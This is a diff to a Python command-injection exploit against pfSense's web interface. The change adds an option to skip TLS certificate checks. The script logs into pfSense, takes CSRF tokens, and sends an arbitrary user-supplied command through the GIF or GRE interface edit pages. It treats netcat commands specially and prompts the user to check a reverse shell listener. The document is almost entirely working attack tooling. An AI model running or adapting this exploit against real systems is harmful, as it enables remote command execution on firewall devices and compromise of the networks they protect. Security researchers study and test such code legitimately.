@@ -7,6 +7,10 @@ from rich.progress import Progress
 from rich import box
 from bs4 import BeautifulSoup
 import threading
+import urllib3
+
+# Suppress InsecureRequestWarning
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Initialize Rich Console
 console = Console()
@@ -20,6 +24,7 @@ def parse_args():
     parser.add_argument('--mode', required=True, choices=['gif', 'gre'], help='Exploit mode: gif or gre')
     parser.add_argument('-c', '--command', required=True, help='Command to inject')
     parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode to print response data')
+    parser.add_argument('--insecure', action='store_true', help='Allow insecure server connections when using SSL (similar to curl -k)')
     return parser.parse_args()
 
 # Function to print the banner
@@ -41,9 +46,9 @@ def timestamp():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 # Function to check if the target is reachable
-def check_target_reachable(target):
+def check_target_reachable(target, insecure):
     try:
-        response = requests.get(f"{target}/")
+        response = requests.get(f"{target}/", verify=not insecure)
         if response.status_code == 200:
             console.print(f"[{timestamp()}] [bold green][SUCCESS] Target {target} is reachable[/bold green]")
             return True
@@ -55,10 +60,10 @@ def check_target_reachable(target):
         return False
 
 # Function to extract CSRF token from a page
-def get_csrf_token(session, target, url_path, debug):
+def get_csrf_token(session, target, url_path, insecure, debug):
     full_url = f"{target}/{url_path}"
     console.print(f"[{timestamp()}] [bold cyan][INFO] Fetching CSRF token from: {full_url}[/bold cyan]")
-    response = session.get(full_url)
+    response = session.get(full_url, verify=not insecure)
 
     if response.status_code != 200:
         console.print(f"[{timestamp()}] [bold red][ERROR] Failed to fetch page {url_path}[/bold red]")
@@ -77,8 +82,8 @@ def get_csrf_token(session, target, url_path, debug):
         return None
 
 # Function to login to pfSense and return session
-def login(session, target, username, password, debug):
-    csrf_token = get_csrf_token(session, target, "", debug)
+def login(session, target, username, password, insecure, debug):
+    csrf_token = get_csrf_token(session, target, "", insecure, debug)
     if not csrf_token:
         sys.exit(1)
 
@@ -91,7 +96,7 @@ def login(session, target, username, password, debug):
     }
 
     console.print(f"[{timestamp()}] [bold cyan][INFO] Sending login request to {login_url}[/bold cyan]")
-    response = session.post(login_url, data=login_data)
+    response = session.post(login_url, data=login_data, verify=not insecure)
 
     if response.status_code == 200 and "dashboard" in response.text.lower():
         console.print(f"[{timestamp()}] [bold green][SUCCESS] Logged in successfully[/bold green]")
@@ -101,7 +106,7 @@ def login(session, target, username, password, debug):
         return False
 
 # Function to send the exploit request with timeout handling
-def send_exploit(session, exploit_url, data, mode, debug):
+def send_exploit(session, exploit_url, data, mode, insecure, debug):
     console.print(f"[{timestamp()}] [bold cyan][INFO] Sending {mode.upper()} exploit request to {exploit_url}[/bold cyan]")
     with Progress() as progress:
         task = progress.add_task(f"[cyan]Sending {mode.upper()} exploit...", total=100)
@@ -110,7 +115,7 @@ def send_exploit(session, exploit_url, data, mode, debug):
 
     try:
         # Send the exploit request with a timeout of 10 seconds
-        exploit_response = session.post(exploit_url, data=data, timeout=10)
+        exploit_response = session.post(exploit_url, data=data, timeout=10, verify=not insecure)
 
         if debug:
             console.print(f"[{timestamp()}] [bold yellow][DEBUG] Exploit response data: {exploit_response.text[:500]}[/bold yellow]")
@@ -123,13 +128,13 @@ def send_exploit(session, exploit_url, data, mode, debug):
         console.print(f"[{timestamp()}] [bold yellow][WARNING] Request timed out. Reverse shell might have been triggered. Check your listener![/bold yellow]")
 
 # Consolidated exploit function for both GIF and GRE
-def exploit(session, target, command, mode, debug):
+def exploit(session, target, command, mode, insecure, debug):
     # Determine URL and parameter based on the mode
     url_path = "interfaces_gif_edit.php" if mode == 'gif' else "interfaces_gre_edit.php"
     param_name = "gifif" if mode == 'gif' else "greif"
 
     # Fetch CSRF token
-    csrf_token = get_csrf_token(session, target, url_path, debug)
+    csrf_token = get_csrf_token(session, target, url_path, insecure, debug)
     if not csrf_token:
         sys.exit(1)
 
@@ -151,13 +156,13 @@ def exploit(session, target, command, mode, debug):
     # If command contains 'nc', use threading
     if "nc" in command:
         console.print(f"[{timestamp()}] [bold blue][INFO] Netcat command detected. Running exploit in a new thread.[/bold blue]")
-        thread = threading.Thread(target=send_exploit, args=(session, exploit_url, malicious_data, mode, debug))
+        thread = threading.Thread(target=send_exploit, args=(session, exploit_url, malicious_data, mode, insecure, debug))
         thread.start()
 
         # Inform the user to check their reverse shell listener
         console.print(f"[{timestamp()}] [bold yellow][INFO] Check your reverse shell listener window[/bold yellow]")
     else:
-        send_exploit(session, exploit_url, malicious_data, mode, debug)
+        send_exploit(session, exploit_url, malicious_data, mode, insecure, debug)
 
 def main():
     # Print banner
@@ -170,15 +175,15 @@ def main():
     session = requests.Session()
 
     # Step 1: Check if the target is reachable
-    if not check_target_reachable(args.target):
+    if not check_target_reachable(args.target, args.insecure):
         sys.exit(1)
 
     # Step 2: Log in to pfSense
-    if not login(session, args.target, args.username, args.password, args.debug):
+    if not login(session, args.target, args.username, args.password, args.insecure, args.debug):
         sys.exit(1)
 
     # Step 3: Execute the command injection exploit with the chosen command
-    exploit(session, args.target, args.command, args.mode, args.debug)
+    exploit(session, args.target, args.command, args.mode, args.insecure, args.debug)
 
 if __name__ == "__main__":
     main()
